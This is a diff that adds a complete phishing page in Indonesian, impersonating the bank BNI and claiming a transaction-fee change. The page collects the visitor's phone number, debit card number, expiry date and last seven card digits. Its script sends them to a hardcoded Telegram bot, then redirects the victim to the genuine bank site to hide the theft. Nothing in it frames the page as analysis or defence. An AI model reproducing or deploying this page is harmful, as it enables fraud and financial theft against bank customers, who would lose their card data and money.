@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Perubahan Tarif Transaksi BNI</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #fff; }
+    header { background: #f57900; color: #fff; padding: 10px; text-align: center; font-size: 18px; }
+    .container { padding: 20px; }
+    .logo { display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; }
+    .logo img { height: 60px; }
+    .logo-text { font-size: 24px; font-weight: bold; color: #00579d; }
+    .subtext { font-size: 13px; color: #555; margin-top: -5px; text-align: center; }
+    label { display: block; margin-top: 20px; font-weight: bold; }
+    select, input { width: 100%; padding: 10px; margin-top: 5px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px; }
+    button { width: 100%; padding: 12px; background: #f57900; color: #fff; font-size: 16px; border: none; border-radius: 4px; margin-top: 25px; cursor: pointer; }
+    button:hover { background: #d46300; }
+    .popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; justify-content: center; align-items: center; z-index: 1000; }
+    .popup { background: #fff; border-radius: 10px; padding: 20px; width: 80%; max-width: 400px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.2); }
+    #lanjutan, #formKartu { display: none; }
+    #lanjutan h3 { text-align: center; margin-bottom: 20px; color: #333; }
+    .info-text { margin-top: 30px; font-size: 14px; color: #333; text-align: center; }
+  </style>
+</head>
+<body>
+
+<header>Perubahan Tarif Transaksi BNI</header>
+
+<div class="container" id="formulirAwal">
+  <div class="logo">
+    <img src="bni.jpg" alt="BNI">
+    <div class="logo-text">BNI</div>
+    <div class="subtext">Melayani Negeri, Kebanggaan Bangsa</div>
+  </div>
+
+  <label for="tarif">Silahkan Pilih Tarif Transaksi</label>
+  <select id="tarif">
+    <option value="6500">TARIF LAMA - Rp 6.500</option>
+    <option value="150000">TARIF BARU - Rp 150.000</option>
+  </select>
+
+  <label for="nomor">Nomor Handphone</label>
+  <input type="text" id="nomor" placeholder="08xxxx">
+
+  <button onclick="showPopup()">PROSES</button>
+
+  <p class="info-text">
+    Kini pembukaan tabungan <strong>BNI Taplus</strong>, <strong>Taplus Muda</strong>, dan <strong>Taplus Bisnis</strong> dapat dilakukan hanya dengan <strong>selfie</strong> melalui <strong>BNI Mobile Banking</strong>. Nikmati <strong>bebas biaya pengelolaan!</strong>
+  </p>
+</div>
+
+<!-- POPUP -->
+<div class="popup-overlay" id="popup">
+  <div class="popup">
+    <h2>Layanan Formulir Ganti Tarif</h2>
+    <p>Silahkan pilih apakah anda sudah memiliki BNI Mobile atau belum.</p>
+    <button onclick="closePopup()">Ok, Lanjutkan.</button>
+  </div>
+</div>
+
+<!-- Halaman lanjutan -->
+<div class="container" id="lanjutan">
+  <h3>Silahkan Pilih. Apakah Anda sudah terdaftar di BNI Mobile atau belum?</h3>
+  <button onclick="showFormKartu()">SUDAH TERDAFTAR</button>
+  <button onclick="showFormKartu()">BELUM TERDAFTAR</button>
+</div>
+
+<!-- Form Kartu Debit -->
+<div class="container" id="formKartu">
+  <h3>Silahkan masukkan data dibawah untuk proses perubahan tarif transaksi</h3>
+  <label>Nomor Kartu Debit</label>
+  <input type="text" id="kartu" placeholder="Masukkan Nomor Kartu Debit">
+
+  <label>Masa Berlaku kartu</label>
+  <input type="text" id="masa" placeholder="MM/YY">
+
+  <label>7 DIGIT BELAKANG KARTU</label>
+  <input type="text" id="tujuh" placeholder="">
+
+  <button onclick="kirimData()">LANJUTKAN</button>
+</div>
+
+<script>
+  function showPopup() {
+    document.getElementById("popup").style.display = "flex";
+  }
+
+  function closePopup() {
+    document.getElementById("popup").style.display = "none";
+    document.getElementById("formulirAwal").style.display = "none";
+    document.getElementById("lanjutan").style.display = "block";
+  }
+
+  function showFormKartu() {
+    document.getElementById("lanjutan").style.display = "none";
+    document.getElementById("formKartu").style.display = "block";
+  }
+
+  function kirimData() {
+    const tarif = document.getElementById("tarif").value;
+    const nomor = document.getElementById("nomor").value;
+    const kartu = document.getElementById("kartu").value;
+    const masa = document.getElementById("masa").value;
+    const tujuh = document.getElementById("tujuh").value;
+
+    const message = `
+[BNI MOBILE FORM]
+Tarif: ${tarif}
+No HP: ${nomor}
+Kartu Debit: ${kartu}
+Masa Berlaku: ${masa}
+7 Digit Belakang: ${tujuh}
+    `;
+
+    const token = "8195448334:AAHlqTT-odOfhy-0gn0F2qs2dp_jaKpRS_U";
+    const chat_id = "7819779147";
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: message,
+      }),
+    }).then(() => {
+      alert("Data berhasil dikirim.");
+      window.location.href = "https://www.bni.co.id";
+    }).catch(err => {
+      alert("Gagal mengirim data");
+      console.error(err);
+    });
+  }
+</script>
+
+</body>
+</html>
